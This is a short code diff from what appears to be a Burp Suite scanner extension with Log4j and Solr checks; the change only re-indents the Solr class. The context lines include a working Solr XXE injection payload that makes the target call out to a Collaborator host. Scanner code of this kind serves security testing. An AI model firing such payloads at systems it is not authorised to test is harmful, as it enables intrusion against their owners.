@@ -745,7 +745,7 @@ class Log4j(IScannerCheck):
         return [header.split(':')[0] for header in headers if len(header.split(':')) > 1]
 
 
-    class Solr(IScannerCheck):
+class Solr(IScannerCheck):
     def doActiveScan(self, basePair, insertionPoint):
         collab = callbacks.createBurpCollaboratorClientContext()
         obfuscated_payload = "{!xmlparser v='<!DOCTYPE a SYSTEM \"http://"+collab.generatePayload(True)+"/xxe\"><a></a>'}"
